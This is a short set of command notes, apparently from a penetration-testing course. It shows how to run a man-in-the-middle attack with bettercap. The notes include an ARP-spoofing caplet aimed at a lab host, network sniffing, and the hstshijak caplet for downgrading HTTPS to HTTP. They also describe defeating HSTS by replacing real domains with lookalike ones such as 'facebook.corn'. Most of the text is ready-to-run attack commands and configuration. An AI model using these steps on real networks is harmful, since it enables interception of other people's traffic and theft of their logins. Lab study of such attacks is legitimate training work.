# solution -> Downgrade HTTPS to HTTP
# we'll use a tool called sslstrip to downgrade
# within this folder, there's a folder called hstshijak
# we want to copy these files to location where bettercap loads its caplets
# /usr/share/bettercap/caplets

### caplet
# save the file with a .cap extension <i.e. caplet file>

bettercap -iface eth0 -caplet spoof.cap
:'
net.probe on
set arp.spoof.fullduplex true
set arp.spoof.targets 10.0.2.7
arp.spoof on
set net.sniff.local true
net.sniff on
'

# if you want to list all the caplets that come with bettercap
caplets.show

# run the hstshijak/hstshijak caplet by just typing the name of the caplet
hstshijak/hstshijak

### Bypassing hsts
:'
    Modern browsers are hard-coded to only load a list of HSTS websites over https
    Solution:
        trick the browser into loading a different website
        replace all links for HSTS websites with similar link e.g.
        facebook.com -> facebook.corn
        twitter.com -> twiter.com
'
# navigate to /usr/share/bettercap/caplets
# open the config file for the hstshijak which is hstshijak.cap
# inside this file, you can find and change are the targets and the replacements
# targets are the domains that use hsts that you want to replace